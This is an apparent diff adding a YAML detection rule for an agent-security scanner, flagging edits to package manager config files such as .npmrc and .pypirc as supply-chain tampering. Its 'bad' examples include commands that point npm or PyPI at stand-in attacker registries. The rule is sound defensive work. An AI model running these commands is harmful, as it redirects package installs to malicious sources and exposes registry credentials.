@@ -1,0 +1,56 @@
+id: "supply-chain/config-tampering/package-config-edit"
+version: "1.0.0"
+kingdom: "Supply Chain Compromise"
+kingdom_id: 7
+category: "Config Tampering"
+category_id: "7.2"
+name: "Package Config File Edit"
+risk_level: "high"
+
+abstract: |
+  Modification of package registry config files (.npmrc, .pypirc) can redirect package
+  resolution to malicious sources, enabling dependency confusion, supply chain injection,
+  or credential theft from registry tokens stored in these files.
+
+explanation: |
+  Package manager configuration files specify registry URLs, authentication tokens,
+  and install behavior. When an agent modifies these files it can:
+  - Redirect all package installs to an attacker-controlled registry
+  - Add a registry that shadows official packages with malicious versions
+  - Extract authentication tokens stored in `.npmrc` (often npm access tokens)
+  - Disable integrity checking or signature verification
+
+  Key files at risk:
+  - `.npmrc` — npm registry URL, `_authToken`, scoped package registries
+  - `.yarnrc.yml` / `.yarnrc` — yarn registry configuration
+  - `.pypirc` — PyPI upload credentials and registry configuration
+  - `pip.conf` — pip index URL override
+
+recommendation: |
+  - Block write access to `.npmrc`, `.yarnrc`, `.pypirc`, and `pip.conf` files.
+  - Audit any changes to package manager configuration files in agent sessions.
+  - Pin package manager configuration to a read-only, verified state.
+  - Monitor for unauthorized registry URL additions.
+
+examples:
+  bad:
+    - "echo 'registry=https://evil.example.com' >> .npmrc"
+    - "echo '[distutils]\\nindex-servers = malicious' > ~/.pypirc"
+    - "npm config set registry https://attacker.com/npm"
+  good:
+    - "cat .npmrc"
+    - "npm config get registry"
+
+compliance:
+  owasp-llm-2025: ["LLM05", "LLM08"]
+  iso-27001-2022: ["A.8.30", "A.8.9"]
+  eu-ai-act-2024: ["Art.15"]
+  nist-ai-rmf-1.0: ["MANAGE-2", "MANAGE-4"]
+  soc2-type2: ["CC6.3", "CC8.1"]
+
+references:
+  mitre_attack: ["T1195.001"]
+  cwe: ["CWE-829"]
+
+analyzers: ["regex", "structural"]
+related_rules: ["sc-block-npmrc-edit", "sc-block-pypirc-edit"]
